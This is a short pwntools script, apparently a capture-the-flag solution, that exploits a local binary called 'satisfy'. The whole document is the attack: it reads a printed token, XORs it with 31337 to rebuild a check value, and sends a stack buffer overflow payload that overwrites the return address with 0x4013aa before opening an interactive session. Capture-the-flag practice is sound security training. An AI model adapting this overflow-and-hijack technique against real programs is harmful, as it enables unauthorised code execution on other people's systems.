#!python3
from pwn import *
elf = ELF("./satisfy")
p = process("./satisfy")

p.recvuntil("token ")
t = str(p.recvuntil("\n").decode())

local10 = int(t) ^ 31337

print(local10)
p.sendline(b"A"*16+p64(0x0)+p64(local10)+b"b"*8+p64(0x4013aa))
p.interactive()